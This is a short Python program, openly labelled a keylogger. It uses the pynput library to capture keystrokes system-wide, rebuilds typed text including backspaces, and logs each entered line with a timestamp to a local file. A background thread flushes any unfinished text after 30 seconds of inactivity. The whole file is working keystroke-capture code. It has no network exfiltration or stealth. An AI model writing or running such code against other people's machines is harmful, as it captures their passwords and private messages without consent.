from pynput import keyboard
import threading
from datetime import datetime
import queue
import time

print("KEYLOGGER FILE LOADED")

text_buffer = ""

listeners = []                    
event_queue = queue.Queue()       
last_event_time = time.time()      
idle_threshold = 30                
log_file = 'keylog.txt'            



def log_to_file(text):
    with open(log_file, "a") as f:
        f.write(text + "\n")
        f.flush()



def KeyPressed(key):
    global last_event_time, text_buffer

    timestamp = datetime.now().strftime("%H:%M:%S")
    last_event_time = time.time()

    try:
        char = key.char
        if char is not None:
            text_buffer += char   # ONLY update buffer

    except AttributeError:
        special_key = str(key).split('.')[-1].upper()

        if special_key == "BACKSPACE":
            text_buffer = text_buffer[:-1]

        elif special_key == "ENTER":
            if text_buffer.strip():
                log_entry = f"[{timestamp}] TEXT: {text_buffer}"
                log_to_file(log_entry)
                event_queue.put(log_entry)
            text_buffer = ""  # clear buffer




def idle_check():
    global last_event_time, text_buffer

    while True:
        time.sleep(5)

        if time.time() - last_event_time > idle_threshold:
            timestamp = datetime.now().strftime("%H:%M:%S")

            if text_buffer.strip():
                idle_text = f"[{timestamp}] IDLE_TEXT: {text_buffer}"
                log_to_file(idle_text)
                event_queue.put(idle_text)
                text_buffer = ""  # clear buffer

            idle_event = f"[{timestamp}] IDLE: {idle_threshold}s inactive"
            log_to_file(idle_event)
            event_queue.put(idle_event)

            last_event_time = time.time()

if __name__ == "__main__":

    idle_thread = threading.Thread(target=idle_check, daemon=True)
    idle_thread.start()

  
    kb_listener = keyboard.Listener(on_press=KeyPressed)
    kb_listener.start()
    listeners.append(kb_listener)

    try:
        while True:
            time.sleep(1)   
    except KeyboardInterrupt:
        print("Stopping keylogger...")
    finally:
        for l in listeners:
            l.stop()  

            